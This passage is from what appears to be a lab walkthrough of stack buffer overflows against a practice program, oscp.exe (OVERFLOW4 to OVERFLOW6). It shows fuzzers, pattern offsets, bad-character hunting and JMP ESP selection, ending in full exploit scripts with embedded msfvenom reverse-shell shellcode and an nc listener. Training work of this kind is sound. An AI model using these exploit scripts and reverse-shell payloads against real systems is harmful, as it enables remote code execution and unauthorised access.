	payload = "Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 2026.

**Kali**

```
python exploit.py $VICTIM 1337
```

**Immunity Debugger**

```
!mona findmsp -distance 2100
```

<figure><img src="../../.gitbook/assets/image (12) (4).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\xa9\xcd\xd4

```
python exploit.py $VICTIM 1337
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

#bad chars found: \x00\xa9\xcd\xd4
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xce\xcf"
"\xd0\xd1\xd2\xd3\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW4 "
	offset = 2026
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badChars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

<figure><img src="../../.gitbook/assets/image (13) (1) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (18) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with the first one which is 0x625011af but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

<figure><img src="../../.gitbook/assets/image (11) (5) (1).png" alt=""><figcaption></figcaption></figure>

### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\xa9\xcd\xd4" -f c
```

#### **exploit.py - Code Changes #4**

```
import socket, time, sys

#bad chars found: \x00\xa9\xcd\xd4
try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW4 "
	offset = 2026
	overflow = "A" * offset
	retn = "\xaf\x11\x50\x62"
	padding = "\x90" * 16
	payload = ("\xbd\x5d\x45\xd7\x0c\xdb\xc7\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x83\xc0\x04\x31\x68\x0e\x03\x35\x4b\x35\xf9\x39\xbb\x3b"
"\x02\xc1\x3c\x5c\x8a\x24\x0d\x5c\xe8\x2d\x3e\x6c\x7a\x63\xb3"
"\x07\x2e\x97\x40\x65\xe7\x98\xe1\xc0\xd1\x97\xf2\x79\x21\xb6"
"\x70\x80\x76\x18\x48\x4b\x8b\x59\x8d\xb6\x66\x0b\x46\xbc\xd5"
"\xbb\xe3\x88\xe5\x30\xbf\x1d\x6e\xa5\x08\x1f\x5f\x78\x02\x46"
"\x7f\x7b\xc7\xf2\x36\x63\x04\x3e\x80\x18\xfe\xb4\x13\xc8\xce"
"\x35\xbf\x35\xff\xc7\xc1\x72\x38\x38\xb4\x8a\x3a\xc5\xcf\x49"
"\x40\x11\x45\x49\xe2\xd2\xfd\xb5\x12\x36\x9b\x3e\x18\xf3\xef"
"\x18\x3d\x02\x23\x13\x39\x8f\xc2\xf3\xcb\xcb\xe0\xd7\x90\x88"
"\x89\x4e\x7d\x7e\xb5\x90\xde\xdf\x13\xdb\xf3\x34\x2e\x86\x9b"
"\xf9\x03\x38\x5c\x96\x14\x4b\x6e\x39\x8f\xc3\xc2\xb2\x09\x14"
"\x24\xe9\xee\x8a\xdb\x12\x0f\x83\x1f\x46\x5f\xbb\xb6\xe7\x34"
"\x3b\x36\x32\x9a\x6b\x98\xed\x5b\xdb\x58\x5e\x34\x31\x57\x81"
"\x24\x3a\xbd\xaa\xcf\xc1\x56\xdf\x05\xf0\x32\xb7\x1b\x02\x2a"
"\x14\x95\xe4\x26\xb4\xf3\xbf\xde\x2d\x5e\x4b\x7e\xb1\x74\x36"
"\x40\x39\x7b\xc7\x0f\xca\xf6\xdb\xf8\x3a\x4d\x81\xaf\x45\x7b"
"\xad\x2c\xd7\xe0\x2d\x3a\xc4\xbe\x7a\x6b\x3a\xb7\xee\x81\x65"
"\x61\x0c\x58\xf3\x4a\x94\x87\xc0\x55\x15\x45\x7c\x72\x05\x93"
"\x7d\x3e\x71\x4b\x28\xe8\x2f\x2d\x82\x5a\x99\xe7\x79\x35\x4d"
"\x71\xb2\x86\x0b\x7e\x9f\x70\xf3\xcf\x76\xc5\x0c\xff\x1e\xc1"
"\x75\x1d\xbf\x2e\xac\xa5\xdf\xcc\x64\xd0\x77\x49\xed\x59\x1a"
"\x6a\xd8\x9e\x23\xe9\xe8\x5e\xd0\xf1\x99\x5b\x9c\xb5\x72\x16"
"\x8d\x53\x74\x85\xae\x71"
		)
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (15) (5) (1).png" alt=""><figcaption></figcaption></figure>

## oscp.exe - OVERFLOW5

#### fuzzer.py

Slightly modified version of the script given.

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = "OVERFLOW5 "
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```



#### exploit.py

Slightly modified version of the script given.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW5 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.

```
xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
```

### **Crash Replication & Controlling EIP**

```
python fuzzer.py $VICTIM 1337
```

Program crashed at 400 bytes with fuzzer.py

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 400
```

#### **exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW5 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 314.

**Kali**

```
python exploit.py $VICTIM 1337
```

**Immunity Debugger**

```
!mona findmsp -distance 400
```

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

**exploit.py - Code Changes #2**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW5 "
	offset = 314
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

After running the program again we now can fill EIP with our Bs so we now have control of EIP.

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (17) (1) (3).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\x16\x2f\xf4\xfd

```
python exploit.py $VICTIM 1337
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

#Bad chars found: \x00\x16\x2f\xf4\xfd
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfe\xff"
)

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW5 "
	offset = 314
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badChars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```





<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (13) (2) (2).png" alt=""><figcaption></figcaption></figure>

We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with the first one which is 0x625011af but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd" -f c
```

#### **exploit.py - Code Changes #4**

```
import socket, time, sys

#Bad chars found: \x00\x16\x2f\xf4\xfd
try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW5 "
	offset = 314
	overflow = "A" * offset
	retn = "\xaf\x11\x50\x62"
	padding = ""
	payload = ("\xfc\xbb\x0c\x8e\xf6\x94\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xf0\x66\x74\x94\x08"
"\x77\x19\x1c\xed\x46\x19\x7a\x66\xf8\xa9\x08\x2a\xf5\x42\x5c"
"\xde\x8e\x27\x49\xd1\x27\x8d\xaf\xdc\xb8\xbe\x8c\x7f\x3b\xbd"
"\xc0\x5f\x02\x0e\x15\x9e\x43\x73\xd4\xf2\x1c\xff\x4b\xe2\x29"
"\xb5\x57\x89\x62\x5b\xd0\x6e\x32\x5a\xf1\x21\x48\x05\xd1\xc0"
"\x9d\x3d\x58\xda\xc2\x78\x12\x51\x30\xf6\xa5\xb3\x08\xf7\x0a"
"\xfa\xa4\x0a\x52\x3b\x02\xf5\x21\x35\x70\x88\x31\x82\x0a\x56"
"\xb7\x10\xac\x1d\x6f\xfc\x4c\xf1\xf6\x77\x42\xbe\x7d\xdf\x47"
"\x41\x51\x54\x73\xca\x54\xba\xf5\x88\x72\x1e\x5d\x4a\x1a\x07"
"\x3b\x3d\x23\x57\xe4\xe2\x81\x1c\x09\xf6\xbb\x7f\x46\x3b\xf6"
"\x7f\x96\x53\x81\x0c\xa4\xfc\x39\x9a\x84\x75\xe4\x5d\xea\xaf"
"\x50\xf1\x15\x50\xa1\xd8\xd1\x04\xf1\x72\xf3\x24\x9a\x82\xfc"
"\xf0\x0d\xd2\x52\xab\xed\x82\x12\x1b\x86\xc8\x9c\x44\xb6\xf3"
"\x76\xed\x5d\x0e\x11\x18\xa8\x38\x18\x74\xae\x38\xcb\xd9\x27"
"\xde\x81\xf1\x61\x49\x3e\x6b\x28\x01\xdf\x74\xe6\x6c\xdf\xff"
"\x05\x91\xae\xf7\x60\x81\x47\xf8\x3e\xfb\xce\x07\x95\x93\x8d"
"\x9a\x72\x63\xdb\x86\x2c\x34\x8c\x79\x25\xd0\x20\x23\x9f\xc6"
"\xb8\xb5\xd8\x42\x67\x06\xe6\x4b\xea\x32\xcc\x5b\x32\xba\x48"
"\x0f\xea\xed\x06\xf9\x4c\x44\xe9\x53\x07\x3b\xa3\x33\xde\x77"
"\x74\x45\xdf\x5d\x02\xa9\x6e\x08\x53\xd6\x5f\xdc\x53\xaf\xbd"
"\x7c\x9b\x7a\x06\x9c\x7e\xae\x73\x35\x27\x3b\x3e\x58\xd8\x96"
"\x7d\x65\x5b\x12\xfe\x92\x43\x57\xfb\xdf\xc3\x84\x71\x4f\xa6"
"\xaa\x26\x70\xe3\xaa\xc8\x8e\x0c"
		)
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

## oscp.exe - OVERFLOW6

#### fuzzer.py

Slightly modified version of the script given.

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = "OVERFLOW6 "
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```



#### exploit.py

Slightly modified version of the script given.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW6 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.

<pre><code><strong>xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
</strong></code></pre>

### **Crash Replication & Controlling EIP**

```
python fuzzer.py $VICTIM 1337
```

Program crashed at 1100 bytes with fuzzer.py

<figure><img src="../../.gitbook/assets/image (23) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 1100
```

#### **exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW6 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2B